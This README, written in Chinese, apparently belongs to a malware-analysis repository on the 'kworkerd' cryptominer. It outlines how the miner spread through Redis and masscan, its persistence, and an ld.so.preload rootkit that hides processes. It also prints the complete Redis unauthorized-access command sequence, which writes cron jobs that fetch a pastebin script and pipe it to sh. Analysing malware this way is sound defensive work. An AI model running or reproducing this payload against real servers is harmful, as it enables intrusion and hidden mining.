# kworkerd
2018.8 通过redis等途径入侵传播，solvethis.sh为清除脚本

2018.12 更新，攻击者将一些恶意内容放在了：https://github.com/SYSTEMFOUR ；使用chattr +i；检测了云服务商以卸载安全程序；利用开源的masscan进行快速扩散传播

### 利用REDIS未授权执行：
```
config set stop-writes-on-bgsave-error no

flushall

config set dbfilename root

set SwE3SC "\t\n*/10 * * * * root (curl -fsSL https://pastebin.com/raw/xbY7p5Tb||wget -q -O- https://pastebin.com/raw/xbY7p5Tb)|sh\n\t##"

set NysX7D "\t\n*/15 * * * * (curl -fsSL https://pastebin.com/raw/xbY7p5Tb||wget -q -O- https://pastebin.com/raw/xbY7p5Tb)|sh\n\t##"

config set dir /etc/cron.d

save

config set dir /var/spool/cron

save

config set dir /var/spool/cron/crontabs

save

flushall

config set stop-writes-on-bgsave-error yes
```

### pastebin.com_raw_5bjpjvLP:
开始执行的脚本

### python.py
扫描redis和攻击模块

### gw7mywhc.txt
主要功能逻辑

### httpdns
执行JNPewK6r.txt

### JNPewK6r.txt
简化的主功能逻辑

### kworkerds
挖矿程序

### config.json
挖矿程序配置文件

### ld.so.preload
指向恶意链接库/usr/local/lib/libntp.so，用于隐藏top和ps的进程显示

### libntp.so
恶意链接库 rootkit

